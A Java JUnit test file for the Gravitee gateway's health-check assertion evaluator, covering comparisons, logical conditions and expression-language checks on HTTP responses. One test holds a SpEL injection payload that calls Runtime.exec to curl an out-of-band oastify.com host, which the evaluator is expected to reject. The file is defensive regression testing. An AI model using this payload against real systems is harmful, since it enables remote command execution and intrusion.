/*
 * Copyright © 2015 The Gravitee team (http://gravitee.io)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package io.gravitee.gateway.services.healthcheck.eval.assertion;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import io.gravitee.common.http.HttpStatusCode;
import io.gravitee.definition.model.services.healthcheck.HealthCheckResponse;
import io.gravitee.gateway.services.healthcheck.eval.EvaluationException;
import lombok.Builder;
import org.junit.Assert;
import org.junit.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvSource;
import org.junit.jupiter.params.provider.ValueSource;

/**
 * @author David BRASSELY (david.brassely at graviteesource.com)
 * @author GraviteeSource Team
 */
public class AssertionEvaluationTest {

    @ParameterizedTest
    @CsvSource(
        quoteCharacter = '"',
        delimiterString = "->",
        textBlock = """
            "'toto' == 'tata'" -> false
            "'toto' == 'toto'" -> true
            "'toto' != 'tata'" -> true
            "'toto' != 'toto'" -> false
            """
    )
    public void should_validate_assertion_using_single_condition(String assertion, Boolean expected) throws EvaluationException {
        AssertionEvaluation evaluation = new AssertionEvaluation(assertion);

        boolean result = evaluation.validate();
        assertThat(result).isEqualTo(expected);
    }

    @ParameterizedTest
    @CsvSource(
        quoteCharacter = '"',
        delimiterString = "->",
        textBlock = """
            "'toto' == 'toto' && 1 == 2" -> false
            "'toto' == 'toto' && 1 == 1" -> true
            "'toto' == 'tata' && 1 == 1" -> false
            "'toto' == 'tata' && 1 == 2" -> false
            """
    )
    public void should_validate_assertion_using_multiple_condition(String assertion, Boolean expected) throws EvaluationException {
        AssertionEvaluation evaluation = new AssertionEvaluation(assertion);

        boolean result = evaluation.validate();
        assertThat(result).isEqualTo(expected);
    }

    @ParameterizedTest
    @CsvSource(
        quoteCharacter = '"',
        delimiterString = "->",
        textBlock = """
            "#response.status == 200" -> true
            "#response.status == 400" -> false
            "#response.status != 200" -> false
            "#response.status != 400" -> true
            """
    )
    public void should_validate_assertion_using_simple_el(String assertion, Boolean expected) throws EvaluationException {
        AssertionEvaluation evaluation = new AssertionEvaluation(assertion);
        evaluation.setVariable("response", EvaluableHttpResponse.builder().status(HttpStatusCode.OK_200).build());

        boolean result = evaluation.validate();
        assertThat(result).isEqualTo(expected);
    }

    @ParameterizedTest
    @CsvSource(
        quoteCharacter = '"',
        delimiterString = "->",
        textBlock = """
            "#jsonPath(#response.content, '$.status') == 'green'" -> true
            "#jsonPath(#response.content, '$.status') == 'red'" -> false
            """
    )
    public void should_validate_assertion_using_el_with_json_path_condition(String assertion, Boolean expected) throws EvaluationException {
        AssertionEvaluation evaluation = new AssertionEvaluation(assertion);
        evaluation.setVariable(
            "response",
            EvaluableHttpResponse.builder().status(HttpStatusCode.OK_200).content("{\"status\": \"green\"}").build()
        );

        boolean result = evaluation.validate();
        assertThat(result).isEqualTo(expected);
    }

    @Test
    public void should_prevent_evaluating_unsecured_condition() throws EvaluationException {
        String assertion = "T(java.lang.Runtime).getRuntime().exec('curl http://n1pyyk5dls6y66cm4te5xfwqyh48sygn.oastify.com') != null";
        AssertionEvaluation evaluation = new AssertionEvaluation(assertion);

        assertThatThrownBy(evaluation::validate).isInstanceOf(EvaluationException.class);
    }

    @Builder
    public static class EvaluableHttpResponse {

        private int status;
        private String content;

        public int getStatus() {
            return status;
        }

        public void setStatus(int status) {
            this.status = status;
        }

        public String getContent() {
            return content;
        }

        public void setContent(String content) {
            this.content = content;
        }
    }
}
